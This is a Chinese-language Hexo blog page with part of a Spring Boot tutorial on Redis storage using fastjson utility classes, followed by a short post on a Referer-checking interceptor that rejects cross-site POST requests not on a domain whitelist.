<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">spring:</span><br><span class="line">   redis:</span><br><span class="line">    host: 127.0.0.1</span><br><span class="line">    port: 6379</span><br><span class="line">    database: 1 # 设置数据库索引为1 默认为0</span><br><span class="line">    password: # 密码为空</span><br><span class="line">    jedis:</span><br><span class="line">      pool:</span><br><span class="line">        max-active: 1000 # 连接池最大连接数（使用负值表示没有限制）</span><br><span class="line">        max-wait: -1 # 连接池最大阻塞等待时间（使用负值表示没有限制）</span><br><span class="line">        max-idle: 10 # 连接池中的最大空闲连接</span><br><span class="line">        min-idle: 2 # 连接池中的最小空闲连接</span><br><span class="line">    timeout: 5000 # 连接超时时间（毫秒）</span><br></pre></td></tr></table></figure>

<h1 id="4-使用"><a href="#4-使用" class="headerlink" title="4. 使用"></a>4. 使用</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> RedisService redisService;</span><br><span class="line">	</span><br><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"test"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	User user = <span class="keyword">new</span> User();</span><br><span class="line">	user.setId(<span class="number">1001</span>);</span><br><span class="line">	user.setName(<span class="string">"pibigstar"</span>);</span><br><span class="line">	user.setPassword(<span class="string">"123456"</span>);</span><br><span class="line">	<span class="comment">//存数据</span></span><br><span class="line">	redisService.setObject(<span class="string">"my:user"</span>,JSON.toJSONString(user));</span><br><span class="line">	<span class="comment">//取数据</span></span><br><span class="line">	String json = redisService.getObject(<span class="string">"my:user"</span>);</span><br><span class="line">	JSONObject parseObject = JSON.parseObject(json);</span><br><span class="line">	User myUser = JSON.toJavaObject(parseObject, User.class);</span><br><span class="line">	<span class="keyword">return</span> myUser.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用的JSON工具为fastjson</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.47<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="5-在redis工具中查看数据"><a href="#5-在redis工具中查看数据" class="headerlink" title="5. 在redis工具中查看数据"></a>5. 在redis工具中查看数据</h1><p><img src="https://img-blog.csdn.net/20180614153333990?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2p1bm1veGk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt></p>
<h1 id="6-封装工具类"><a href="#6-封装工具类" class="headerlink" title="6. 封装工具类"></a>6. 封装工具类</h1><h2 id="6-1-JSON工具类"><a href="#6-1-JSON工具类" class="headerlink" title="6.1 JSON工具类"></a>6.1 JSON工具类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pibigstar.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * JSON工具类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> pibigstar</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JSONUtil</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * java对象转换为JSON字符串</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> object</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">ObjectToJSON</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> JSON.toJSONString(object);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * JSON字符串转换为Java对象</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> json</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> obj</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">jSONToObject</span><span class="params">(String json, Class&lt;T&gt; obj)</span> </span>&#123;</span><br><span class="line">		JSONObject jsonObject = JSON.parseObject(json);</span><br><span class="line">		<span class="keyword">return</span> (T) JSON.toJavaObject(jsonObject, obj);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * List集合转换为JSON字符串</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> list</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">String <span class="title">listToJSON</span><span class="params">(List&lt;T&gt; list)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> JSONArray.toJSONString(list);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 将JSON字符串转换为List集合</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> json</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> obj</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">List&lt;T&gt; <span class="title">JSONToList</span><span class="params">(String json,Class&lt;T&gt; obj)</span></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> JSON.parseArray(json, obj);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-2-redis操作工具类"><a href="#6-2-redis操作工具类" class="headerlink" title="6.2 redis操作工具类"></a>6.2 redis操作工具类</h2><p>简单的封装一下。。。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pibigstar.springboot.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.RedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.StringRedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisService</span> </span>&#123;</span><br><span class="line">	<span class="meta">@Autowired</span></span><br><span class="line">	<span class="keyword">private</span> StringRedisTemplate stringRedisTemplate;</span><br><span class="line">	<span class="meta">@Autowired</span> </span><br><span class="line">	<span class="keyword">private</span> RedisTemplate&lt;String, Object&gt; redisTemplate; </span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 存储String类型数据</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> key</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> value</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(String key,String value)</span> </span>&#123;</span><br><span class="line">		stringRedisTemplate.opsForValue().set(key, value);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 存储String类型数据</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> key</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> value</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> timeout 过期时间，单位：秒</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(String key,String value,<span class="keyword">long</span> timeout)</span> </span>&#123;</span><br><span class="line">		stringRedisTemplate.opsForValue().set(key, value,timeout,TimeUnit.SECONDS);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 得到String类型数据</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> key</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">get</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> stringRedisTemplate.opsForValue().get(key);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 存储object对象</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> key</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> value</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setObject</span><span class="params">(String key,Object value)</span> </span>&#123;</span><br><span class="line">		redisTemplate.opsForValue().set(key, value);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 存储object对象</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> key</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> value</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> timeout 过期时间，单位：秒</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setObject</span><span class="params">(String key,Object value,<span class="keyword">long</span> timeout)</span> </span>&#123;</span><br><span class="line">		redisTemplate.opsForValue().set(key, value,timeout,TimeUnit.SECONDS);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 得到Object对象</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> key</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> redisTemplate.boundValueOps(key).get();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
          
        
      
    </div>
    
    
    

    <div>
      
    </div>

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://pibigstar.com/2019/03/17/SpringBoot安全验证之Referer拦截器/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="派大星">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/qq.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="派大星的博客">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/17/SpringBoot安全验证之Referer拦截器/" itemprop="url">SpringBoot安全验证之Referer拦截器</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-17T15:03:04+08:00">
                2019-03-17
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/springboot/" itemprop="url" rel="index">
                    <span itemprop="name">springboot</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="自定义Referer拦截器"><a href="#自定义Referer拦截器" class="headerlink" title="自定义Referer拦截器"></a>自定义Referer拦截器</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RefererInterceptor</span> <span class="keyword">extends</span> <span class="title">HandlerInterceptorAdapter</span> </span>&#123;</span><br><span class="line">    <span class="comment">// URL匹配器</span></span><br><span class="line">    <span class="keyword">private</span> AntPathMatcher matcher = <span class="keyword">new</span> AntPathMatcher();</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RefererProperties properties;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest req, HttpServletResponse resp, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String referer = req.getHeader(<span class="string">"referer"</span>);</span><br><span class="line">        String host = req.getServerName();</span><br><span class="line">        <span class="comment">// 只验证POST请求</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"POST"</span>.equals(req.getMethod())) &#123;</span><br><span class="line">            <span class="keyword">if</span> (referer == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 状态置为404</span></span><br><span class="line">                resp.setStatus(HttpServletResponse.SC_NOT_FOUND);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125; </span><br><span class="line">            java.net.URL url = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                url = <span class="keyword">new</span> java.net.URL(referer);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">                <span class="comment">// URL解析异常，也置为404</span></span><br><span class="line">                resp.setStatus(HttpServletResponse.SC_NOT_FOUND);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 首先判断请求域名和referer域名是否相同</span></span><br><span class="line">            <span class="keyword">if</span> (!host.equals(url.getHost())) &#123;</span><br><span class="line">                <span class="comment">// 如果不等，判断是否在白名单中</span></span><br><span class="line">                <span class="keyword">if</span> (properties.getRefererDomain() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (String s : properties.getRefererDomain()) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (s.equals(url.getHost())) &#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="配置白名单Referer域名"><a href="#配置白名单Referer域名" class="headerlink" title="配置白名单Referer域名"></a>配置白名单Referer域名</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties</span>(prefix = <span class="string">"referer"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RefererProperties</span> </span>&#123;</span><br><span class="line">	<span class="comment">// 白名单域名</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; refererDomain;</span><br><span class="line">	<span class="comment">//setter,getter方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="yml配置"><a href="#yml配置" class="headerlink" title="yml配置"></a>yml配置</h2><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">referer:</span></span><br><span class="line">	<span class="attr">refererDomain:</span></span><br><span class="line">	  <span class="bullet">-</span> <span class="string">baidu.com</span></span><br><span class="line">	  <span class="bullet">-</span> <span class="string">pibigstar.com</span></span><br><span class="line">	  <span class="bullet">-</span> <span class="string">mxspvip.cn</span></span><br></pre></td></tr></table></figure>


          
        
      
    </div>
    
    
    

    <div>
      
    </div>

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/9/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/11/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/qq.png" alt="派大星">
            
              <p class="site-author-name" itemprop="name">派大星</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">137</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">64</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">230</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/pibigstar" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://blog.csdn.net/junmoxi" target="_blank" title="CSDN">
                      
                        <i class="fa fa-fw fa-yelp"></i>CSDN</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
        </div>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-[object Object]"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">派大星</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>








        







        
      </div>
    </footer>

    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  
  <script type="text/javascript" src="/js/src/js.cookie.js?v=5.1.4"></script>
  <script type="text/javascript" src="/js/src/scroll-cookie.js?v=5.1.4"></script>


  

</body>
</html>
<!-- 页面点击小红心 -->
 <script type="text/javascript" src="/js/src/clicklove.js"></script>
